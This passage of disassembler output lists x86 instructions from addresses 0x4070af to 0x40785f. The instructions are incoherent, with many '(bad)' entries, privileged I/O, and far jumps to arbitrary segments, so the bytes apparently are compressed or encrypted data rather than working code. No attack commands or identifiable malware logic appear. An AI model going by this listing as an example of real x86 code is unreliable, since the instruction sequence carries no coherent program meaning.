  4070af:	cmp    bh,dl
  4070b1:	test   eax,0xc5021141
  4070b6:	test   al,0x86
  4070b8:	mul    BYTE PTR [ecx+0x31]
  4070bb:	clc    
  4070bc:	sahf   
  4070bd:	push   es
  4070be:	add    DWORD PTR [edx],eax
  4070c0:	not    BYTE PTR [ecx]
  4070c2:	cli    
  4070c3:	in     al,dx
  4070c4:	loopne 0x407058
  4070c6:	xor    DWORD PTR [ebx+0x6f7aa3a2],esi
  4070cc:	retf   0x37ec
  4070cf:	ins    DWORD PTR es:[edi],dx
  4070d0:	push   ecx
  4070d1:	jle    0x40705a
  4070d3:	fsubr  st,st(4)
  4070d5:	repz jecxz 0x4070e5
  4070d8:	inc    ebx
  4070d9:	dec    edi
  4070da:	xor    ah,BYTE PTR [eax+0x7794a297]
  4070e0:	mov    cl,0xa9
  4070e2:	pop    edx
  4070e3:	mov    ebx,0x36bac8c8
  4070e8:	es neg cl
  4070eb:	xor    bh,dh
  4070ed:	pop    DWORD PTR [edx+0x24f9946f]
  4070f3:	sub    al,0x89
  4070f5:	jne    0x40710c
  4070f7:	sti    
  4070f8:	jmp    0x407140
  4070fa:	pop    ecx
  4070fb:	dec    esp
  4070fc:	push   esp
  4070fd:	push   ebx
  4070fe:	add    eax,0x2efc3e7c
  407103:	enter  0x8a69,0x89
  407107:	push   0xffffff9d
  407109:	pushf  
  40710a:	call   FWORD PTR [esi]
  40710c:	mov    ecx,0xa70c510a
  407111:	pop    ecx
  407112:	and    dh,cl
  407114:	and    DWORD PTR [ebx],eax
  407116:	test   DWORD PTR [esi-0x2f126a5],ecx
  40711c:	mov    al,0x33
  40711e:	das    
  40711f:	aam    0x79
  407121:	pop    ss
  407122:	pop    ebp
  407123:	into   
  407124:	scas   eax,DWORD PTR es:[edi]
  407125:	cmp    DWORD PTR [edi-0x27],eax
  407128:	test   DWORD PTR [eax+0x7],ebx
  40712b:	rcl    edi,1
  40712d:	es jo  0x4070f9
  407130:	retf   0xfda8
  407133:	ja     0x4070b8
  407135:	les    esp,FWORD PTR [ebx-0x798c32c3]
  40713b:	xor    al,0x60
  40713d:	call   0xacc1:0x36960909
  407144:	pop    esp
  407145:	push   edi
  407146:	jb     0x4070f1
  407148:	dec    ecx
  407149:	leave  
  40714a:	push   edi
  40714b:	cmp    al,bh
  40714d:	cli    
  40714e:	jo     0x4071b9
  407150:	add    BYTE PTR [edx],dh
  407152:	fild   DWORD PTR [ecx]
  407154:	dec    esp
  407155:	mov    edx,0xeda358c4
  40715a:	push   cs
  40715b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40715c:	jge    0x40718c
  40715e:	test   al,0x11
  407160:	clc    
  407161:	mov    al,ds:0x772ab903
  407166:	test   dh,bh
  407168:	jno    0x40715b
  40716a:	xor    al,0xc5
  40716c:	inc    eax
  40716d:	and    DWORD PTR [ebx-0x31],eax
  407170:	ror    ebx,cl
  407172:	inc    ecx
  407173:	enter  0x4d1b,0x2a
  407177:	sbb    DWORD PTR [eax-0x6d156c34],ebp
  40717d:	xor    bh,cl
  40717f:	loope  0x407136
  407181:	mov    bh,0x13
  407183:	stc    
  407184:	lods   al,BYTE PTR ds:[esi]
  407185:	cmp    al,0xbc
  407187:	ja     0x407185
  407189:	cwde   
  40718a:	push   ecx
  40718b:	jno    0x4071c6
  40718d:	add    DWORD PTR ds:0x776c8856,ebp
  407193:	adc    eax,0x5bfb97b0
  407198:	retf   0x493f
  40719b:	add    BYTE PTR es:[ecx-0x2341a294],cl
  4071a2:	retf   
  4071a3:	xlat   BYTE PTR ds:[ebx]
  4071a4:	cmp    eax,DWORD PTR [edx+ecx*1+0x3d105259]
  4071ab:	or     eax,0x84059f8f
  4071b0:	test   BYTE PTR [eax-0x5],ch
  4071b3:	mov    esi,DWORD PTR [edx]
  4071b5:	or     esi,DWORD PTR [ebp+0x7c5488f0]
  4071bb:	in     eax,dx
  4071bc:	into   
  4071bd:	test   eax,0x398a6c65
  4071c2:	jmp    0xa404:0xba06005e
  4071c9:	adc    DWORD PTR [eax+0x6ee6a95a],edx
  4071cf:	jle    0x40720a
  4071d1:	add    BYTE PTR [ecx-0x61],ah
  4071d4:	xor    dl,BYTE PTR [edx+esi*1+0x19]
  4071d8:	pop    esi
  4071d9:	pop    ss
  4071da:	daa    
  4071db:	ss ret 
  4071dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071de:	pusha  
  4071df:	icebp  
  4071e0:	push   eax
  4071e1:	pop    edi
  4071e2:	dec    esp
  4071e3:	ret    0x7620
  4071e6:	iret   
  4071e7:	gs inc ecx
  4071e9:	sahf   
  4071ea:	mov    cl,BYTE PTR [ebx]
  4071ec:	cwde   
  4071ed:	repnz or eax,0x9172e832
  4071f3:	sub    DWORD PTR [edi-0x60],ebp
  4071f6:	xor    cl,BYTE PTR [ecx+0x54]
  4071f9:	xchg   ebp,eax
  4071fa:	xchg   ebx,eax
  4071fb:	adc    eax,0x14d06c3e
  407200:	sbb    al,0xef
  407202:	imul   edi,ecx,0xc476963e
  407208:	push   es
  407209:	xchg   DWORD PTR [edx+edx*8],ebx
  40720c:	xor    al,BYTE PTR [eax]
  40720e:	cmp    dl,bh
  407210:	adc    ebx,ecx
  407212:	lock stos BYTE PTR es:[edi],al
  407214:	push   ss
  407215:	gs push ebp
  407217:	dec    esp
  407218:	stos   DWORD PTR es:[edi],eax
  407219:	mov    edi,0xe7fc4f1a
  40721e:	shl    BYTE PTR [edx+eiz*4-0x7e04c102],cl
  407225:	pop    eax
  407226:	add    dl,BYTE PTR [edx]
  407228:	icebp  
  407229:	sahf   
  40722a:	add    dl,0xa6
  40722d:	or     eax,0xb9a3152b
  407232:	sahf   
  407233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407234:	fldcw  WORD PTR [edx+0x970234a]
  40723a:	fcomp  DWORD PTR [ebx+0x7d6b8ace]
  407240:	pop    edi
  407241:	pop    esi
  407242:	jne    0x40726f
  407244:	xor    DWORD PTR [esi-0x1b85a175],edx
  40724a:	add    ebp,esp
  40724c:	mov    esp,0x5b9facde
  407251:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407253:	jno    0x407286
  407255:	fnsave [ecx+0x3aac1b4c]
  40725b:	xor    ch,BYTE PTR [eax-0x411e4aea]
  407261:	in     eax,0x70
  407263:	dec    ecx
  407264:	mov    DWORD PTR [ebp+0x21],esp
  407267:	call   0xc52a:0x253b9fa9
  40726e:	addr16 and ch,ch
  407271:	daa    
  407272:	inc    esi
  407273:	pop    ss
  407274:	jae    0x4072d7
  407276:	mov    ds:0x227e9727,eax
  40727b:	shr    dh,cl
  40727d:	imul   ebp,DWORD PTR [edi],0x76
  407280:	inc    ebp
  407281:	cmp    al,0xd8
  407284:	add    edi,DWORD PTR [eax+edi*4]
  407287:	add    al,0x96
  40728a:	into   
  40728b:	fxch   st(7)
  40728d:	in     eax,0x69
  40728f:	mov    dh,0xe8
  407291:	jmp    0x318a5d5e
  407296:	(bad)  
  407298:	rcl    DWORD PTR [ecx+ebp*1-0x61cfcad3],1
  40729f:	xlat   BYTE PTR ds:[ebx]
  4072a0:	or     eax,0xd372b6e4
  4072a5:	fstp   TBYTE PTR [eax]
  4072a7:	in     al,0xfd
  4072a9:	dec    ecx
  4072aa:	pushf  
  4072ab:	sbb    DWORD PTR [edi],esp
  4072ad:	mov    bh,0xb1
  4072af:	mov    bl,0xd4
  4072b1:	mov    bh,BYTE PTR [esi+eiz*2-0x40f8accb]
  4072b8:	mov    eax,0x62f5f4bc
  4072bd:	or     eax,0x4175f660
  4072c2:	iret   
  4072c3:	mov    edx,0xc5c1caca
  4072c8:	mov    esi,0x74c490cb
  4072cd:	mov    ch,0x12
  4072cf:	sti    
  4072d0:	ror    DWORD PTR [edi+edi*1],1
  4072d3:	ins    DWORD PTR es:[edi],dx
  4072d4:	sar    BYTE PTR [eax-0x74923ddb],0xa7
  4072db:	fistp  WORD PTR [ecx-0x7e71889c]
  4072e1:	or     DWORD PTR [edi-0x4049c1db],ecx
  4072e7:	and    al,0x7f
  4072e9:	xchg   edi,eax
  4072ea:	or     al,bl
  4072ec:	ins    DWORD PTR es:[edi],dx
  4072ed:	jg     0x40729e
  4072ef:	mov    ecx,0xc694b710
  4072f4:	or     al,0xfb
  4072f6:	adc    DWORD PTR [esi],edx
  4072f8:	jecxz  0x40727a
  4072fa:	push   esi
  4072fb:	adc    ecx,DWORD PTR [ebx]
  4072fd:	jnp    0x4072aa
  4072ff:	into   
  407300:	in     al,dx
  407301:	pusha  
  407302:	(bad)  [edx]
  407304:	add    edi,DWORD PTR [ebx]
  407306:	fs test eax,0x840b55db
  40730c:	scas   eax,DWORD PTR es:[edi]
  40730d:	add    BYTE PTR [esi],ah
  40730f:	xchg   esi,eax
  407310:	mov    ecx,0xe8a203e9
  407315:	into   
  407316:	in     al,0xfa
  407318:	jmp    0xaeac6bc3
  40731d:	jo     0x4072e8
  40731f:	aas    
  407320:	mov    ebp,esp
  407322:	and    DWORD PTR [ecx+esi*4+0x70],esi
  407326:	lds    ebx,FWORD PTR [edx]
  407328:	test   DWORD PTR [ecx+0x7fcfd329],eax
  40732e:	ins    DWORD PTR es:[edi],dx
  40732f:	xor    ebp,edx
  407331:	mov    al,ds:0xbaa05686
  407336:	xchg   ebx,ebx
  407338:	jns    0x407379
  40733a:	sbb    DWORD PTR [eax-0x23e10037],esp
  407340:	leave  
  407341:	pop    esi
  407342:	aad    0xf5
  407344:	cmc    
  407345:	stos   DWORD PTR es:[edi],eax
  407346:	idiv   BYTE PTR [edx-0x1]
  407349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40734a:	mov    DWORD PTR [ebp+eax*8-0x55],esp
  40734e:	iret   
  40734f:	jb     0x407333
  407351:	xchg   esi,eax
  407352:	xor    al,0x31
  407354:	push   esp
  407355:	scas   al,BYTE PTR es:[edi]
  407356:	lock add edi,DWORD PTR ds:0x7d14ebec
  40735d:	pop    ds
  40735e:	push   edi
  40735f:	pop    ebp
  407360:	mov    esi,0x3622ad86
  407365:	inc    edx
  407366:	or     esp,DWORD PTR [edx-0x1c]
  407369:	gs hlt 
  40736b:	mov    bh,0x69
  40736d:	or     esi,DWORD PTR [eax]
  40736f:	adc    DWORD PTR [ecx+ebp*4],ebp
  407372:	jnp    0x4073bb
  407374:	jns    0x407357
  407376:	xor    BYTE PTR [edx+0x5b],al
  407379:	popa   
  40737a:	mov    ebp,DWORD PTR [edi-0x2a]
  40737d:	into   
  40737e:	inc    edx
  40737f:	daa    
  407380:	mov    ebx,0xab1ecfe5
  407385:	int    0x9c
  407387:	js     0x40739c
  407389:	scas   eax,DWORD PTR es:[edi]
  40738a:	jns    0x407348
  40738c:	enter  0x4917,0x8
  407390:	sbb    dh,dl
  407392:	sub    DWORD PTR [edx],0x30
  407395:	adc    BYTE PTR [ebp+0x57],dl
  407398:	xor    bh,BYTE PTR [ecx]
  40739a:	rol    DWORD PTR [edx],cl
  40739c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40739d:	xor    al,BYTE PTR [edx+0x41af574d]
  4073a3:	jg     0x407380
  4073a5:	std    
  4073a6:	jge    0x407359
  4073a8:	xor    DWORD PTR [ebp+0xea1293b],esi
  4073ae:	outs   dx,BYTE PTR ds:[esi]
  4073af:	unpcklps xmm7,xmm1
  4073b2:	pop    ebp
  4073b3:	(bad)  
  4073b4:	fst    DWORD PTR [edx]
  4073b6:	sub    DWORD PTR [edx+ebp*8],esi
  4073b9:	pusha  
  4073ba:	push   cs
  4073bb:	leave  
  4073bc:	jecxz  0x407369
  4073be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073bf:	jl     0x4073e8
  4073c1:	sub    DWORD PTR [esi+0x5d],ebp
  4073c4:	xchg   DWORD PTR [esi+0x18],esp
  4073c7:	cmc    
  4073c8:	aad    0x3
  4073ca:	jg     0x407371
  4073cc:	dec    edx
  4073cd:	sbb    DWORD PTR [eax+0x4cb8af59],esp
  4073d3:	loope  0x407388
  4073d5:	adc    DWORD PTR es:[ebx+0x38],edx
  4073d9:	jns    0x4073b1
  4073db:	hlt    
  4073dc:	add    eax,0xa0d5a0a9
  4073e1:	push   es
  4073e2:	push   ebx
  4073e3:	push   ecx
  4073e4:	adc    eax,0xc55f9522
  4073e9:	jle    0x40738e
  4073eb:	fwait
  4073ec:	xchg   ebx,eax
  4073ed:	dec    edi
  4073ee:	inc    ebp
  4073ef:	(bad)  
  4073f0:	idiv   BYTE PTR [esi]
  4073f2:	(bad)  
  4073f3:	pop    ecx
  4073f4:	sbb    BYTE PTR [ebx+0x4ddfc5a1],cl
  4073fa:	frstor [ebp+0x7b]
  4073fd:	mov    esp,0x230d42be
  407402:	pop    ebx
  407403:	xchg   ecx,eax
  407404:	mov    ds:0xde7deeb3,al
  407409:	iret   
  40740a:	jecxz  0x407436
  40740c:	jmp    0x4073df
  40740e:	shr    BYTE PTR [eax],cl
  407410:	ja     0x40742e
  407412:	pop    ebx
  407413:	ds pop ss
  407415:	frstor [edi]
  407417:	div    DWORD PTR [ecx]
  407419:	add    edx,edx
  40741b:	cmp    eax,0x4b44bba9
  407420:	inc    eax
  407421:	pavgw  mm2,QWORD PTR [ecx]
  407424:	jae    0x407427
  407426:	adc    ch,BYTE PTR [edx]
  407428:	push   0x242d134c
  40742d:	xor    al,0xc
  40742f:	mov    ebx,0x825ffdc4
  407434:	fcom   st(0)
  407436:	cdq    
  407437:	sub    BYTE PTR [ebx+0xe4f7704],cl
  40743d:	cli    
  40743e:	shl    BYTE PTR [eax],cl
  407440:	mov    bh,0x40
  407442:	test   cl,ch
  407444:	xchg   ebx,eax
  407445:	icebp  
  407446:	icebp  
  407447:	push   eax
  407448:	push   0x79
  40744a:	adc    al,0x2e
  40744c:	xor    eax,0x77b5a4b
  407451:	call   0x5be4:0xc540d081
  407458:	cmp    dl,ch
  40745a:	nop
  40745b:	jo     0x407451
  40745d:	mov    al,ds:0x73162f8f
  407462:	imul   edx,ebx,0x2
  407465:	cmp    BYTE PTR [eax-0x180251be],0xa9
  40746c:	adc    BYTE PTR [edi],bh
  40746e:	dec    ebp
  40746f:	arpl   WORD PTR [ebp+0x7b93bea6],ax
  407475:	inc    ecx
  407476:	push   edx
  407477:	dec    edx
  407478:	xchg   ebp,eax
  407479:	rol    al,1
  40747b:	xor    ebp,ebx
  40747d:	ss dec edi
  40747f:	jecxz  0x40743c
  407481:	cmp    ah,ch
  407483:	mov    ?,WORD PTR [ebx-0x1b]
  407486:	cmp    DWORD PTR [ebp+edx*2-0xa669819],eax
  40748d:	add    esp,esp
  40748f:	sbb    BYTE PTR [edi+0x22],bl
  407492:	dec    ecx
  407493:	aam    0x18
  407495:	pop    ebx
  407496:	sbb    BYTE PTR [esi+0x5d],dl
  407499:	iret   
  40749a:	dec    esi
  40749b:	jecxz  0x407481
  40749d:	mul    DWORD PTR [esi]
  40749f:	popf   
  4074a0:	push   edi
  4074a1:	sub    DWORD PTR [bp+0x12],ecx
  4074a5:	(bad)  
  4074a6:	sub    BYTE PTR [esi-0x2f],ch
  4074a9:	jmp    0xb4ad2ba7
  4074ae:	pop    es
  4074af:	outs   dx,DWORD PTR ds:[esi]
  4074b0:	pop    edx
  4074b1:	idiv   BYTE PTR [edx-0x2a16f1ed]
  4074b7:	mov    ch,BYTE PTR [eax]
  4074b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ba:	push   esp
  4074bb:	popa   
  4074bc:	scas   eax,DWORD PTR es:[edi]
  4074bd:	dec    edx
  4074be:	push   ebp
  4074bf:	and    ah,BYTE PTR [edx]
  4074c1:	into   
  4074c2:	imul   ebp,DWORD PTR [ecx-0x1d6a8b45],0x816154c5
  4074cc:	data16 ds out dx,al
  4074cf:	jmp    0xa1f0da10
  4074d4:	pop    es
  4074d5:	dec    ebp
  4074d6:	(bad)
  4074d9:	aad    0xe8
  4074db:	pop    edi
  4074dc:	cld    
  4074dd:	jp     0x4074e2
  4074df:	enter  0xd96c,0xab
  4074e3:	inc    edi
  4074e4:	ret    0x6f95
  4074e7:	sbb    esi,eax
  4074e9:	cmp    esp,ecx
  4074eb:	test   DWORD PTR [edi+0x1c],edi
  4074ee:	pop    ebx
  4074ef:	cmp    eax,0x15d4a508
  4074f4:	int3   
  4074f5:	jg     0x4074d5
  4074f7:	pop    esp
  4074f8:	inc    esi
  4074f9:	cwde   
  4074fa:	add    al,0x6f
  4074fc:	sti    
  4074fd:	mov    al,0x62
  4074ff:	dec    edi
  407500:	mov    ebx,0x3f0733cd
  407505:	adc    ch,BYTE PTR ds:0xb9796e80
  40750b:	scas   al,BYTE PTR es:[edi]
  40750c:	das    
  40750d:	(bad)
  407510:	arpl   WORD PTR [eax-0x77],di
  407513:	js     0x4074df
  407515:	inc    ecx
  407516:	xor    ecx,DWORD PTR [ebp-0x25]
  407519:	push   0xffffffdb
  40751b:	shr    BYTE PTR [eax+0x12],cl
  40751e:	fcmove st,st(3)
  407520:	dec    edi
  407521:	cmp    eax,0x7e424c75
  407526:	mov    esi,0x3f54cb47
  40752b:	mov    ecx,0x866d2c3b
  407530:	pusha  
  407531:	pushf  
  407532:	dec    ecx
  407533:	xchg   ebx,eax
  407534:	xchg   esp,eax
  407535:	pop    edi
  407536:	aad    0x53
  407538:	lea    edx,[esi-0x56020805]
  40753e:	dec    ebx
  40753f:	push   esi
  407540:	push   ecx
  407541:	xor    eax,0x8909689e
  407546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407547:	or     edi,esi
  407549:	mov    edi,DWORD PTR [eax-0x35]
  40754c:	not    DWORD PTR [ecx-0x4b41f31f]
  407552:	sbb    DWORD PTR [esi+esi*1-0x16],0x34
  407557:	mov    ecx,0xcd5e328d
  40755c:	pop    edi
  40755d:	add    ebp,ecx
  40755f:	xchg   esp,eax
  407560:	jge    0x407503
  407562:	and    BYTE PTR [esi-0x60],0xb7
  407566:	xor    al,0x46
  407568:	or     edx,edx
  40756a:	(bad)  
  40756b:	out    dx,eax
  40756c:	push   esi
  40756d:	or     eax,0x8ae94ec1
  407572:	jne    0x407532
  407574:	loop   0x40752d
  407576:	js     0x4075e5
  407578:	popa   
  407579:	mov    ch,0x97
  40757b:	mov    WORD PTR [edi],?
  40757d:	mov    cl,0x4e
  40757f:	fdivr  st(6),st
  407581:	sar    DWORD PTR [ecx+0x3fa450e1],1
  407587:	and    DWORD PTR [ebp+ebx*4-0x7a],edi
  40758b:	cmp    bl,bl
  40758d:	cdq    
  40758e:	out    0xaf,eax
  407590:	fsubr  DWORD PTR [eax-0x5a13dbc5]
  407596:	repnz rcl BYTE PTR [esi-0x68c432ef],cl
  40759d:	dec    ebp
  40759e:	mov    ecx,0x58b2170
  4075a3:	(bad)  
  4075a4:	test   eax,0xb09aa64c
  4075a9:	jbe    0x4075b3
  4075ab:	fist   WORD PTR [edi-0x32f5cc5f]
  4075b1:	pop    eax
  4075b2:	fdiv   st(0),st
  4075b4:	xchg   ebp,eax
  4075b5:	sub    al,0xf7
  4075b7:	cmc    
  4075b8:	bound  esp,QWORD PTR ds:0x8bcb789e
  4075be:	xchg   DWORD PTR [bp+si],ecx
  4075c1:	std    
  4075c2:	or     DWORD PTR ds:0xb6553d28,ecx
  4075c8:	dec    ebp
  4075c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075ca:	cwde   
  4075cb:	xor    al,0x4d
  4075cd:	xchg   DWORD PTR [edx+eiz*8],esi
  4075d0:	push   ebx
  4075d1:	call   FWORD PTR [esi+edi*8-0xd90deec]
  4075d8:	or     bl,cl
  4075da:	xor    ah,ah
  4075dc:	out    0x99,eax
  4075de:	and    DWORD PTR [ebp+0x21],ebp
  4075e1:	fisttp QWORD PTR [edx+0x22c11cb3]
  4075e7:	cmc    
  4075e8:	pop    eax
  4075e9:	mov    cs,ebp
  4075eb:	cld    
  4075ec:	dec    DWORD PTR [esi-0x68]
  4075ef:	hlt    
  4075f0:	push   0x74
  4075f2:	pusha  
  4075f3:	mov    dl,0xe0
  4075f5:	jne    0x4075f5
  4075f7:	daa    
  4075f8:	cmp    BYTE PTR [esi+0x5c70aac],0x4b
  4075ff:	out    dx,eax
  407600:	mov    dl,BYTE PTR [esi-0x20554689]
  407606:	jl     0x40760f
  407608:	adc    al,0xa7
  40760a:	mov    eax,ds:0x2ece05c6
  40760f:	push   ebx
  407610:	sbb    BYTE PTR [edx-0x4303796],ch
  407616:	fdivr  DWORD PTR [ebx+0x6460ccf7]
  40761c:	js     0x407638
  40761e:	aas    
  40761f:	lock gs mov ebx,0xdc60ec81
  407626:	ret    
  407627:	adc    BYTE PTR [edx],ch
  407629:	or     ebx,DWORD PTR [ebx-0x70c21a9e]
  40762f:	or     al,0x7
  407631:	adc    DWORD PTR [edx],eax
  407633:	bound  ecx,QWORD PTR [ebx+ebx*2]
  407636:	pop    ds
  407637:	mov    esi,0xcacf7e19
  40763c:	data16 outs dx,BYTE PTR ds:[esi]
  40763e:	aas    
  40763f:	jns    0x4075d0
  407641:	ds or  al,0xed
  407644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407645:	push   esp
  407646:	lahf   
  407647:	mov    dh,0xf9
  407649:	and    cl,0x36
  40764c:	dec    ebx
  40764d:	mov    ecx,0x72acbfae
  407652:	inc    edi
  407653:	cmp    esp,DWORD PTR [ebp-0x4]
  407656:	out    0x5b,al
  407658:	stos   BYTE PTR es:[edi],al
  407659:	adc    al,0xf4
  40765b:	adc    al,0x2d
  40765d:	push   esi
  40765e:	xchg   ebp,eax
  40765f:	frndint 
  407661:	and    BYTE PTR [esi-0x5d],dh
  407664:	push   cs
  407665:	cmp    BYTE PTR [edi+0x4c],0x62
  407669:	(bad)  
  40766a:	jl     0x407620
  40766c:	mov    cl,0xb2
  40766e:	xchg   edx,ebp
  407670:	inc    ebp
  407671:	jg     0x4076d6
  407673:	jl     0x407632
  407675:	ror    ebp,cl
  407677:	bound  eax,QWORD PTR [eax]
  407679:	lods   eax,DWORD PTR ds:[esi]
  40767a:	mov    ds:0x159ba9db,eax
  40767f:	push   ebx
  407680:	or     al,0x58
  407682:	push   esp
  407683:	inc    ebp
  407684:	loopne 0x407642
  407686:	pop    ebp
  407687:	push   ebx
  407688:	adc    eax,0xcb28efd3
  40768d:	jo     0x4076cd
  40768f:	add    edx,DWORD PTR [ebx]
  407691:	ret    
  407692:	add    eax,0x25acf04b
  407697:	xor    eax,0xe2187f9a
  40769c:	or     BYTE PTR [ecx+0x6a3ecdc6],0x7d
  4076a3:	push   ecx
  4076a4:	leave  
  4076a5:	jmp    0xf23a:0x8bad956c
  4076ac:	jge    0x407709
  4076ae:	cld    
  4076af:	fwait
  4076b0:	enter  0xef4f,0x5e
  4076b4:	retf   0x4ef4
  4076b7:	pop    edi
  4076b8:	pop    ecx
  4076b9:	sbb    dl,BYTE PTR [ebx+0x32]
  4076bc:	xchg   ecx,eax
  4076bd:	xor    eax,DWORD PTR [ecx]
  4076bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076c0:	adc    eax,0xbdcb92bf
  4076c5:	shr    DWORD PTR [edx-0x305cfe4a],cl
  4076cb:	popf   
  4076cc:	retf   
  4076cd:	xor    esi,DWORD PTR [ecx]
  4076cf:	xchg   edi,eax
  4076d0:	jnp    0x4076d1
  4076d2:	jne    0x407687
  4076d4:	add    DWORD PTR [esi+esi*1+0x40],0xffffffe3
  4076d9:	test   ah,0x32
  4076dc:	jo     0x407740
  4076de:	or     DWORD PTR [ecx+0x8],esp
  4076e1:	jno    0x4076ed
  4076e3:	and    cl,BYTE PTR [esi-0x5c]
  4076e6:	and    DWORD PTR [ebp+0x40],esp
  4076e9:	mul    DWORD PTR [edx+0x3e7568d4]
  4076ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f0:	sub    BYTE PTR [ecx+0x7780d5a],al
  4076f6:	ins    DWORD PTR es:[edi],dx
  4076f7:	mov    ds:0x414786c9,eax
  4076fc:	and    al,0x3d
  4076fe:	test   BYTE PTR ds:[eax],bh
  407701:	xor    bl,BYTE PTR [esi+0x2b]
  407704:	inc    ebx
  407705:	popf   
  407706:	add    bh,dh
  407708:	mov    cl,0x4c
  40770a:	lods   al,BYTE PTR ds:[esi]
  40770b:	enter  0x4f14,0xe6
  40770f:	mov    ah,0x91
  407711:	sbb    DWORD PTR [ecx],0xb286ff07
  407717:	pop    edi
  407718:	outs   dx,BYTE PTR ds:[esi]
  407719:	mov    edx,eax
  40771b:	adc    bl,0x41
  40771e:	in     eax,0xc3
  407720:	mov    ah,0x6
  407722:	dec    eax
  407723:	push   edx
  407724:	nop
  407725:	add    BYTE PTR [ecx+edi*1-0x46256c82],0x7e
  40772d:	fidiv  DWORD PTR [esi-0x1317c0be]
  407733:	ja     0x407780
  407735:	sbb    eax,DWORD PTR [edi-0x69]
  407738:	pop    es
  407739:	test   ebx,eax
  40773b:	pop    edx
  40773c:	aaa    
  40773d:	outs   dx,BYTE PTR ds:[esi]
  40773e:	fdivr  DWORD PTR [ebx-0x58125392]
  407744:	sbb    DWORD PTR [eax+0x5e],ecx
  407747:	dec    edx
  407748:	test   DWORD PTR [edx+esi*2-0x27],esi
  40774c:	pop    eax
  40774d:	dec    edx
  40774e:	push   ebx
  40774f:	gs call 0xa8d6:0x98a9e2ee
  407757:	inc    edi
  407758:	push   ebx
  407759:	or     cl,dh
  40775b:	pop    ecx
  40775c:	dec    ecx
  40775d:	sub    BYTE PTR [eax-0x3b],cl
  407760:	xor    eax,0xf661dcc8
  407765:	ds cmc 
  407767:	add    al,0x61
  407769:	dec    esp
  40776a:	leave  
  40776b:	xchg   esi,eax
  40776c:	jo     0x4077e0
  40776e:	in     eax,0x99
  407770:	fnstcw WORD PTR [esi+edi*4-0x50884371]
  407777:	sub    eax,DWORD PTR [ebp-0x4498319]
  40777d:	dec    eax
  40777e:	(bad)  
  40777f:	fucom  st(3)
  407781:	sbb    DWORD PTR [esi-0x11],ebp
  407784:	pop    eax
  407785:	inc    edx
  407786:	mov    dl,BYTE PTR [ecx]
  407788:	adc    DWORD PTR [edi+0x77066eb1],ebp
  40778e:	in     eax,0xc4
  407790:	inc    edi
  407791:	inc    cl
  407793:	xlat   BYTE PTR ds:[ebx]
  407794:	daa    
  407795:	(bad)  
  407796:	scas   al,BYTE PTR es:[edi]
  407797:	stc    
  407798:	call   0x8a68:0xfcce0709
  40779f:	rol    bh,1
  4077a1:	in     al,0x23
  4077a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077a4:	mov    ch,0x46
  4077a6:	popa   
  4077a7:	jge    0x407793
  4077a9:	xor    eax,0x65f74c11
  4077ae:	in     eax,0xf5
  4077b0:	es dec esp
  4077b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077b3:	stc    
  4077b4:	pop    edx
  4077b5:	and    ebp,DWORD PTR [ecx]
  4077b7:	sub    BYTE PTR [esi+0x4e],ah
  4077ba:	int3   
  4077bb:	inc    edi
  4077bc:	fmul   st(2),st
  4077be:	lea    ebx,[esi]
  4077c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077c1:	jmp    0x7fada820
  4077c6:	hlt    
  4077c7:	jge    0x407788
  4077c9:	dec    esp
  4077ca:	xchg   edi,eax
  4077cb:	and    DWORD PTR [ebp+0x7e],eax
  4077ce:	rol    bx,0xd3
  4077d2:	inc    eax
  4077d3:	clc    
  4077d4:	push   ecx
  4077d5:	jne    0x4077e9
  4077d7:	scas   al,BYTE PTR es:[edi]
  4077d8:	pop    ss
  4077d9:	jb     0x407784
  4077db:	(bad)  
  4077dc:	push   ebp
  4077dd:	in     eax,0xb4
  4077df:	jp     0x407765
  4077e1:	aad    0xa2
  4077e3:	std    
  4077e4:	sbb    bl,dl
  4077e6:	(bad)  
  4077e7:	cli    
  4077e8:	(bad)  
  4077e9:	aaa    
  4077ea:	sub    bh,dh
  4077ec:	inc    ecx
  4077ed:	call   0x379a2742
  4077f2:	dec    ebp
  4077f3:	mov    esi,0x1a5af1b9
  4077f8:	push   cs
  4077f9:	or     al,BYTE PTR [esi-0x228ad57b]
  4077ff:	xchg   ecx,eax
  407800:	shl    cl,0xa4
  407803:	scas   eax,DWORD PTR es:[edi]
  407804:	or     al,0xe3
  407806:	xlat   BYTE PTR ds:[ebx]
  407807:	xor    al,bh
  407809:	sti    
  40780a:	mov    bh,0x50
  40780c:	rol    DWORD PTR [ebp+0x4f112024],1
  407812:	retf   0xf05e
  407815:	outs   dx,DWORD PTR ds:[esi]
  407816:	outs   dx,DWORD PTR ds:[esi]
  407817:	mov    ss,ecx
  407819:	push   0x84a5ac45
  40781e:	mov    dh,0xd5
  407820:	sub    ecx,DWORD PTR [esi-0x7e]
  407823:	iret   
  407824:	dec    eax
  407825:	dec    edx
  407826:	pop    esi
  407827:	data16 int 0x1e
  40782a:	jle    0x407826
  40782c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40782d:	arpl   bp,cx
  40782f:	rcr    DWORD PTR [ebx+0x16],1
  407832:	jmp    0xfce5:0x116c7454
  407839:	aad    0x54
  40783b:	adc    eax,0x3bc50ac6
  407840:	lahf   
  407841:	sbb    al,0x30
  407843:	icebp  
  407844:	call   0xfa9e:0x9aa8d874
  40784b:	mov    cl,0xa7
  40784d:	mov    esi,0x9c816f32
  407852:	xor    DWORD PTR [eax+0xe],esp
  407855:	ins    BYTE PTR es:[edi],dx
  407856:	std    
  407857:	iret   
  407858:	mov    dl,0xe9
  40785a:	mov    cl,0xaa
  40785c:	push   esp
  40785d:	jle    0x4078d6
  40785f:	aad    0x91
